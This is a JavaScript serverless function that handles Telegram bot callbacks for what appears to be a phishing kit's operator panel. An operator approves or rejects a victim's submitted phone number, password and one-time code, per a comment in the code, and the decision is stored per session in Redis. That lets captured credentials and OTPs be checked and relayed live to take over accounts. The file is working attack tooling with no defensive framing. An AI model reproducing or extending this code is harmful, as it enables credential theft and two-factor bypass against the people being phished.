const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisSet(key, value, exSeconds = 600) {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}/ex/${exSeconds}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
}

async function answerCallback(callbackQueryId, text) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
    });
}

async function editMessage(chatId, messageId, newText) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            text: newText,
            parse_mode: 'Markdown'
        })
    });
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    const body = JSON.parse(event.body || '{}');
    const cb = body.callback_query;
    if (!cb) return { statusCode: 200, body: 'ok' };

    const data = cb.data || '';
    const chatId = cb.message.chat.id;
    const messageId = cb.message.message_id;
    const cbId = cb.id;
    const origText = cb.message.text || ''; // The original text containing phone/password/otp

    // ── Login decisions ──────────────────────────────────────────────
    if (data.startsWith('login_ok:')) {
        const sessionId = data.split(':')[1];
        await redisSet(`session:${sessionId}:login`, 'approved');
        await answerCallback(cbId, '✅ Approved!');
        await editMessage(chatId, messageId, `✅ *Login Approved*\n\n${origText}`);
    }
    else if (data.startsWith('login_wrong_number:')) {
        const sessionId = data.split(':')[1];
        await redisSet(`session:${sessionId}:login`, 'wrong_number');
        await answerCallback(cbId, '❌ Wrong Number');
        await editMessage(chatId, messageId, `❌ *Wrong Number*\n\n${origText}`);
    }
    else if (data.startsWith('login_wrong_password:')) {
        const sessionId = data.split(':')[1];
        await redisSet(`session:${sessionId}:login`, 'wrong_password');
        await answerCallback(cbId, '❌ Wrong Password');
        await editMessage(chatId, messageId, `❌ *Wrong Password*\n\n${origText}`);
    }

    // ── OTP decisions ────────────────────────────────────────────────
    else if (data.startsWith('otp_ok:')) {
        const sessionId = data.split(':')[1];
        await redisSet(`session:${sessionId}:otp`, 'approved');
        await answerCallback(cbId, '✅ OTP Correct!');
        await editMessage(chatId, messageId, `✅ *OTP Approved*\n\n${origText}`);
    }
    else if (data.startsWith('otp_wrong:')) {
        const sessionId = data.split(':')[1];
        await redisSet(`session:${sessionId}:otp`, 'wrong_otp');
        await answerCallback(cbId, '❌ Wrong OTP');
        await editMessage(chatId, messageId, `❌ *Wrong OTP*\n\n${origText}`);
    }

    return { statusCode: 200, body: 'ok' };
};
